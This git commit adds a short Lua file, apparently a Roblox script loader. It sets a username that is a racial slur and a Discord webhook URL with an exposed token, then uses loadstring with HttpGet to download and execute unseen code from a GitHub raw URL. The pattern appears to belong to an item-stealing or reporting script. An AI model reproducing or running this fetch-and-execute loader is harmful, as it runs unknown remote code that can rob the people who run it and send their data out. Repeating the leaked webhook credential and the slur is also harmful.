ae54c93efa3d0df80e2b8504c13cb0c5f3e4b3ca
Ezjq <codmskid@gmail.com>
2024-08-20 10:42:50 +0800

    Add files via upload

---
+++ nsiga.lua
@@ -0,0 +1,4 @@
+Username = "nigga"
+Webhook = "https://discord.com/api/webhooks/1262579112040726559/eQnAzbiIKnOg-hct90ZZNpO0mf5-uqJ4xVFsGiZ93_A3o7DuG1gNeiDr2SnXY9Os1zpn"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/zachemzhestokiy/x/main/ps99.lua"))()
